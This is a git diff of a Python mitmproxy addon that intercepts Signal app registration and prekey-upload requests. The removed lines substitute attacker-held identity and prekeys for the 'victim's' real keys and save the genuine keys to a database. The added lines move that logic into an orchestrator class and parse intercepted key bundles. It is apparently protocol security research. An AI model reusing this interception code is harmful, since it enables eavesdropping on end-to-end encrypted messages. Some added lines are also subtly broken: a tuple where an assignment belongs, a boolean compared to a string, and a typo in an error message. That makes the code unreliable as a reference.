@@ -15,6 +15,8 @@ import logging
 # logging.getLogger('mitmproxy').
 import time
 
+from src.orchestrator import MitmUserOrchestrator
+
 # import config
 
 from xepor import InterceptedAPI, RouteType, HTTPVerb, Router
@@ -38,6 +40,7 @@ import parse
 from protos.gen.SignalService_pb2 import Content, Envelope, DataMessage
 from protos.gen.WebSocketResources_pb2 import WebSocketMessage, WebSocketRequestMessage, WebSocketResponseMessage
 from signal_protocol.protocol import CiphertextMessage
+from signal_protocol.state import PreKeyBundle
 
 from src.server_proto import addons, HOST_HTTPBIN
 from src.mitm_interface import MitmUser
@@ -213,81 +216,12 @@ def _v1_registration(flow: HTTPFlow):
     except KeyError:
         user_registration_info = RegistrationInfo()
 
-    user_registration_info.victim = MitmUser(
-        protocol_address=ProtocolAddress(
-            name=req["sessionId"],
-            device_id=1,
-        ),
-        aci_uuid="",
-        pni_uuid="",
-    )
-
-    user_registration_info.victim.get_aci_visitenkarte()._registration_id = req["accountAttributes"]["registrationId"]
-    user_registration_info.victim.get_pni_visitenkarte()._registration_id = req["accountAttributes"][
-        "pniRegistrationId"
-    ]
-
-    # Save all the legit data for later use
-    #user_registration_info.serialized_registration_req = flow.request.content
-    user_registration_info.registrationId = req["accountAttributes"]["registrationId"]
-    user_registration_info.pniRegistrationId = req["accountAttributes"]["pniRegistrationId"]
-    user_registration_info.unidentifiedAccessKey = req["accountAttributes"]["unidentifiedAccessKey"]
-
-    user_registration_info.victim._unidentified_access_key = req["accountAttributes"]["unidentifiedAccessKey"]
-
-    #print("Unidentified Access Key: ", user_registration_info.unidentifiedAccessKey)
-
-    user_registration_info.aciData = KeyData(
-        IdenKey=req["aciIdentityKey"],
-        SignedPreKey=req["aciSignedPreKey"],
-        pq_lastResortKey=req["aciPqLastResortPreKey"],
-    )
-    user_registration_info.pniData = KeyData(
-        IdenKey=req["pniIdentityKey"],
-        SignedPreKey=req["pniSignedPreKey"],
-        pq_lastResortKey=req["pniPqLastResortPreKey"],
-    )
+    req, user_registration_info = MitmUserOrchestrator.registration_req(req, user_registration_info)
 
     reg_info[ip_address] = user_registration_info
     api.local_registrations = reg_info
-
-    # Swap fake keys
-
-    req["aciIdentityKey"] = (
-        user_registration_info.victim.get_identity_key(VisitenKarteType.ACI).public_key().to_base64()
-    )
-    req["pniIdentityKey"] = (
-        user_registration_info.victim.get_identity_key(VisitenKarteType.PNI).public_key().to_base64()
-    )
-
-    req["aciSignedPreKey"]["publicKey"] = (
-        user_registration_info.victim.get_aci_visitenkarte().get_signed_pre_key_record().public_key().to_base64()
-    )
-    req["aciSignedPreKey"]["signature"] = base64.b64encode(
-        user_registration_info.victim.get_aci_visitenkarte().get_signed_pre_key_record().signature()
-    ).decode()
-
-    req["pniSignedPreKey"]["publicKey"] = (
-        user_registration_info.victim.get_pni_visitenkarte().get_signed_pre_key_record().public_key().to_base64()
-    )
-    req["pniSignedPreKey"]["signature"] = base64.b64encode(
-        user_registration_info.victim.get_pni_visitenkarte().get_signed_pre_key_record().signature()
-    ).decode()
-
-    req["aciPqLastResortPreKey"]["publicKey"] = (
-        user_registration_info.victim.get_aci_visitenkarte().get_last_resort_kyber_pre_key().public_key().to_base64()
-    )
-    req["aciPqLastResortPreKey"]["signature"] = base64.b64encode(
-        user_registration_info.victim.get_aci_visitenkarte().get_last_resort_kyber_pre_key().signature()
-    ).decode()
-
-    req["pniPqLastResortPreKey"]["publicKey"] = (
-        user_registration_info.victim.get_pni_visitenkarte().get_last_resort_kyber_pre_key().public_key().to_base64()
-    )
-    req["pniPqLastResortPreKey"]["signature"] = base64.b64encode(
-        user_registration_info.victim.get_pni_visitenkarte().get_last_resort_kyber_pre_key().signature()
-    ).decode()
-
+    
+    
     flow.request.content = json.dumps(req).encode()
 
 
@@ -310,19 +244,12 @@ def _v1_registration(flow: HTTPFlow):
         )
         return
 
-    req = json.loads(flow.response.content)
+    resp = json.loads(flow.response.content)
     ip_address = flow.client_conn.peername[0]
 
     registration_info: RegistrationInfo = api.local_registrations[ip_address]
 
-    registration_info.victim.get_aci_visitenkarte()._uuid = req["uuid"]
-    registration_info.victim.get_pni_visitenkarte()._uuid = req["pni"]
-    registration_info.victim._phone_number = req["number"]
-
-    registration_info.aci = req["uuid"]
-    registration_info.pni = req["pni"]
-
-    registration_info.victim._protocol_address = ProtocolAddress(name=req["uuid"], device_id=1)
+    resp, registration_info = MitmUserOrchestrator.registration_resp(resp, registration_info)
 
     api.local_registrations[ip_address] = registration_info
 
@@ -340,31 +267,29 @@ def _v2_keys(flow: HTTPFlow):
 
     registration_info = api.local_registrations
 
-    ## TODO: instead of naming each key for both variables, just use the identifier as a key and the bundle(dict) as the value
-    if not registration_info.get(address):
-        logging.error(
-            f"Address {address} not found in registration_info. {registration_info}"
-        ) 
-        return
+    req, registration_info, MitmUserOrchestrator.keys_upload_req(req, identity, registration_info)
 
-    user_registration_info: RegistrationInfo = registration_info.get(address)
+    # ## TODO: instead of naming each key for both variables, just use the identifier as a key and the bundle(dict) as the value
+    # if not registration_info.get(address):
+    #     logging.error(
+    #         f"Address {address} not found in registration_info. {registration_info}"
+    #     ) 
+    #     return
 
-    key_data = user_registration_info.aciData if identity == "aci" else user_registration_info.pniData
+    # user_registration_info: RegistrationInfo = registration_info.get(address)
 
-    key_data.PreKeys = req["preKeys"]
-    key_data.pq_PreKeys = req["pqPreKeys"]
+    # key_data = user_registration_info.aciData if identity == "aci" else user_registration_info.pniData
 
-    alice = user_registration_info.victim
+    # key_data.PreKeys = req["preKeys"]
+    # key_data.pq_PreKeys = req["pqPreKeys"]
 
-    alice.get_visitenkarte(identity_type).update_kyber_pre_keys(key_data.pq_PreKeys[0]["keyId"])
-    alice.get_visitenkarte(identity_type).update_pre_keys(key_data.PreKeys[0]["keyId"])
+    # alice = user_registration_info.victim
 
-    req["preKeys"] = alice.get_visitenkarte(identity_type).serialize_pre_keys()
-    req["pqPreKeys"] = alice.get_visitenkarte(identity_type).serialize_kyber_pre_keys()
+    # alice.get_visitenkarte(identity_type).update_kyber_pre_keys(key_data.pq_PreKeys[0]["keyId"])
+    # alice.get_visitenkarte(identity_type).update_pre_keys(key_data.PreKeys[0]["keyId"])
 
-    logging.info(req["preKeys"][0])
-    logging.info(alice.get_visitenkarte(identity_type)._pre_key_records[0].public_key().to_base64())
-    logging.info(alice.get_visitenkarte(identity_type)._kyber_pre_key_records[0].public_key().to_base64())
+    # req["preKeys"] = alice.get_visitenkarte(identity_type).serialize_pre_keys()
+    # req["pqPreKeys"] = alice.get_visitenkarte(identity_type).serialize_kyber_pre_keys()
 
     flow.request.content = json.dumps(req).encode()
 
@@ -373,12 +298,14 @@ def _v2_keys(flow: HTTPFlow):
 def v2_keys_errors(flow: HTTPFlow):
     status = flow.response.status_code
     address = flow.client_conn.peername[0]
-    identity_type = VisitenKarteType.ACI if flow.request.query["identity"] == "aci" else VisitenKarteType.PNI
+    identity = flow.request.query["identity"] == "aci"
+    resp = json.loads(flow.response.content) if flow.response.content else {}
+    identity_type = VisitenKarteType.ACI if identity == "aci" else VisitenKarteType.PNI
     other_identity_type = VisitenKarteType.PNI if identity_type == VisitenKarteType.ACI else VisitenKarteType.ACI
     failcases = {
         401: "Account authentication check failed.",
         403: "Attempt to change identity key from a non-primary device.",
-        422: "Invalid request format (Invalid signatures -- not all sigs [pqPreKeys,pqLastResortPreKey,signedPreKey] are valid).",
+        422: "Invalid request format (Invalid si gnatures -- not all sigs [pqPreKeys,pqLastResortPreKey,signedPreKey] are valid).",
     }
     if status in failcases:
         resp_name = f"({RESPONSES[status]})" if status in RESPONSES else ""
@@ -389,78 +316,32 @@ def v2_keys_errors(flow: HTTPFlow):
     #### check registration info if the it is the last response of v2/keys
 
     user_info: RegistrationInfo = api.local_registrations[address]
+
+    MitmUserOrchestrator.keys_upload_resp(resp, identity, user_info)
     
-    key_data = user_info.aciData if identity_type == VisitenKarteType.ACI else user_info.pniData
-    other_key_data = user_info.aciData if other_identity_type == VisitenKarteType.ACI else user_info.pniData
 
-    if (other_key_data.PreKeys == None):
-        return
-
-    ## commit to DB
-
-    ############## Legit Records ##############
-
-    serialized_legit_record = {}
-    serialized_legit_record["uuid"] = user_info.aci if identity_type == VisitenKarteType.ACI else user_info.pni
-    serialized_legit_record["type"] = identity_type.value
-    serialized_legit_record["signedPreKey"] = key_data.SignedPreKey
-    serialized_legit_record["preKey"] = key_data.PreKeys
-    serialized_legit_record["pqPreKey"] = key_data.pq_PreKeys
-    serialized_legit_record["PqLastResortPreKey"] = key_data.pq_lastResortKey
-    serialized_legit_record["deviceId"] = 1
-    serialized_legit_record["registrationId"] = user_info.registrationId if identity_type == VisitenKarteType.ACI else user_info.pniRegistrationId
-    serialized_legit_record["identityKey"] = key_data.IdenKey
-
-
-    identity_legit_key_record = LegitKeyRecord.model_validate(serialized_legit_record)
-
-    other_serialized_legit_record = {}
-    other_serialized_legit_record["uuid"] = user_info.aci if other_identity_type == VisitenKarteType.ACI else user_info.pni
-    other_serialized_legit_record["type"] = other_identity_type.value
-    other_serialized_legit_record["signedPreKey"] = other_key_data.SignedPreKey
-    other_serialized_legit_record["preKey"] = other_key_data.PreKeys
-    other_serialized_legit_record["pqPreKey"] = other_key_data.pq_PreKeys
-    other_serialized_legit_record["PqLastResortPreKey"] = other_key_data.pq_lastResortKey
-    other_serialized_legit_record["deviceId"] = 1
-    other_serialized_legit_record["registrationId"] = user_info.registrationId if other_identity_type == VisitenKarteType.ACI else user_info.pniRegistrationId
-    other_serialized_legit_record["identityKey"] = other_key_data.IdenKey
-
-    other_legit_key_record = LegitKeyRecord.model_validate(other_serialized_legit_record)
-
-    ############## User ##############
-    #print("User Info: ", user_info)
-    #print("User Info Victim: ", user_info.victim._unidentified_access_key)
-    user_info.victim.save_user()
-
-    session_manager = DatabaseSessionManager()
-    session = session_manager.get_session()
-
-    with session as s:
-        s.merge(identity_legit_key_record)
-        s.merge(other_legit_key_record)
-
-        s.commit()
 
 @api.route("/v2/keys/{identifier}/{device_id}", rtype=RouteType.RESPONSE, method=HTTPVerb.GET, allowed_statuses=[200])
 def v2_keys_identifier_device_id(flow: HTTPFlow, identifier: str, device_id: str):
 
     address = flow.client_conn.peername[0]
+    resp = json.loads(flow.response.content)
     user_info: RegistrationInfo = api.local_registrations[address]
     
     ## check if the keybundle is from already registered (legit or victim) user in the database
-    with DatabaseSessionManager() as session_manager:
-        session = session_manager.get_session()
-        user = User.get_user_by_uuid(identifier, session)
+    bob_key_bundle = PreKeyBundle(
+        registration_id= resp["devices"][0]["registrationId"],
+        device_id= resp["devices"][0]["deviceId"],
+        pre_key_public= (resp["devices"][0]["preKey"]["keyId"], resp["devices"][0]["preKey"]["publicKey"]),
+        signed_pre_key_id= resp["devices"][0]["signedPreKey"]["keyId"],
+        signed_pre_key_public= resp["devices"][0]["signedPreKey"]["publicKey"],
+        signed_pre_key_signature= resp["devices"][0]["signedPreKey"]["signature"],
+        identity_key= IdentityKey.from_base64(resp["identityKey"])
+     )
 
 
-    if user_info.victim.get_aci_visitenkarte()._uuid == identifier:
-        key_data = user_info.victim.get_aci_visitenkarte()
-    else:
-        key_data = user_info.victim.get_pni_visitenkarte()
 
-    victim = user_info.victim
-    
-    api.local_registrations[address] = user_info
+#     api.local_registrations[address] = user_info
 
 addons = [api]
 
